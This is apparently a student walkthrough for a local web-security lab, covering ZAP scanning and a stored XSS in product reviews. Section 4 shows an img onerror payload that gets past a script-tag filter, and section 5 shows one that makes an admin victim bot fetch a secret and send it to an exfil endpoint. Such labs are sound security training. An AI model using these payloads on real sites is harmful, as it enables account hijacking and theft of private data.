# Lab-G Walkthrough

This guide outlines what a student should do to complete the lab.

## 1. Start everything

Open the following in your browser after running the container:

- Application: `http://localhost:30000`
- ZAP UI: `http://localhost:30004`
- Dashboard: `http://localhost:30000/dashboard`

Wait ~60 seconds for ZAP and the victim bot to spin up.

## 2. Recon / find the review entry point

1. Register, log in, and navigate to any product.
2. Submit a review and confirm it renders on the page.

The reviews section stores and redisplays the submitted HTML, so it is the attack surface.

## 3. Scan with ZAP

1. In ZAP, set the target to `http://localhost:30000`.
2. Use Quick Start → Attack to spider and scan the site.
3. Review the Alerts tab for stored XSS findings.
4. Export the report: Report → Generate HTML Report, save as `/home/labDirectory/zap-report.html`.

## 4. Demonstrate the XSS

The site only strips `<script>` tags. Use other injection points, for example:

```html
<img src=x onerror="alert('XSS')">
```

Submit it as a review and refresh the page to see the alert. Save the working payload to `/home/labDirectory/xss-payload.txt`.

## 5. Exfiltrate the admin secret

The victim bot browses reviews while logged in as admin. Craft a payload that calls `/api/admin/profile` (which returns `secretFlag`) and ships it to your dashboard (`/exfil` endpoint).

Example:

```html
<img src=x onerror="fetch('/api/admin/profile').then(r=>r.json()).then(d=>fetch('/exfil?flag='+encodeURIComponent(d.secretFlag)))">
```

Wait ~30 seconds and then check `http://localhost:30000/dashboard` for the stolen flag. Save it to `/home/labDirectory/exfiltrated-flag.txt`.

## 6. Submit flags

Write all collected flags into `/home/labDirectory/flag.txt`, one per line.

## Troubleshooting

- If a service is missing: `docker ps` / `docker logs <container>`.
- To restart clean: `bash /home/.evaluationScripts/activityInitiator/reset.sh`.
